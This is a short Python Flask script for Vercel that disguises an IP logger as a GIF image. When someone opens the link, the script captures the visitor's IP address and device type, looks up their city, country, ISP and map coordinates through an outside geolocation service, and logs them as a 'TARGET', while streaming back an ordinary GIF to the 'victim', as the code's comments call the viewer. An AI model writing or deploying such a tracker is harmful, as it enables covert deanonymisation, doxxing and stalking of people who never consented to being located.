import os
import requests
import time
from flask import Flask, request, Response
from colorama import Fore, Style, init

# Initialize colorama for internal log formatting
init(autoreset=True)

app = Flask(__name__)

GIF_URL = "https://image2url.com/r2/default/gifs/1769080905307-99d00efd-644c-4fb0-8689-540943a56db8.gif"

def get_computer_info(ua):
    """Extracts approximate computer/OS name from User-Agent."""
    if "Windows NT 10.0" in ua: return "Windows 10/11 PC"
    if "Windows NT 6.1" in ua: return "Windows 7 PC"
    if "Macintosh" in ua: return "Apple Mac"
    if "X11" in ua: return "Linux System"
    if "Android" in ua: return "Android Device"
    if "iPhone" in ua: return "iPhone"
    return "Unknown Device"

@app.route('/view.gif')
def gif_logger():
    # Vercel uses x-forwarded-for to pass the real victim IP
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    ua = request.headers.get('user-agent', 'Unknown')
    comp_name = get_computer_info(ua)
    
    loc, isp, map_link = "Private/Local", "N/A", "N/A"

    try:
        # Increased timeout for more reliable geolocation
        g = requests.get(f'http://ip-api.com/json/{ip}?fields=24857', timeout=10).json()
        if g.get('status') == 'success':
            loc = f"{g.get('city')}, {g.get('country')}"
            isp = g.get('isp')
            map_link = f"http://google.com/maps?q={g.get('lat')},{g.get('lon')}"
    except:
        pass

    # Print to Vercel Logs (View these in your Vercel Dashboard)
    print(f"\n[+] xun4rt hit detected!")
    print(f"[>] TARGET IP   : {ip}")
    print(f"[>] COMP NAME   : {comp_name}")
    print(f"[>] LOCATION    : {loc}")
    print(f"[>] ISP         : {isp}")
    print(f"[>] MAPS        : {map_link}")

    # Stream the GIF back to the victim
    r = requests.get(GIF_URL, stream=True)
    return Response(r.iter_content(chunk_size=1024), content_type='image/gif')


# No app.run() for Vercel; it handles the server start
